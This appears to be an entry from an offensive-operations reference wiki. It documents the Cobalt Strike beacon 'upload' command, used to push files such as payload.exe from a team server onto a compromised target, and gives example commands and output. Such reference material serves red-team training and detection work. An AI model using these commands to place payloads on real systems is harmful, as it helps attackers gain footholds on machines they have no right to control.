---
type: command
executor: beacon
data: beacon > upload $_LOCAL_PATH
tags:
  - cobalt-strike
  - file-management
  - ingress
platforms:
  - Windows
  - Linux
verified: true
validated: true
---

# cobalt-strike-upload-file

## Command

```bash
beacon > upload $_LOCAL_PATH
```

## Description

Uploads a file from the team server to the target's current working directory for payload deployment.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_LOCAL_PATH | Path to the file on the team server (e.g., /teamserver/loot/payload.exe). | Yes |

## Examples

### Basic Usage

```bash
beacon > upload /path/to/payload.exe
```

### Advanced Usage

```bash
beacon > upload config.txt
```

## Expected Output

Upload progress and completion, e.g.:

[*] Uploaded to C:\\Temp\\payload.exe

## Related

- [[procedures/Cobalt-Strike-File-Management]]
- [[tools/Cobalt-Strike]]
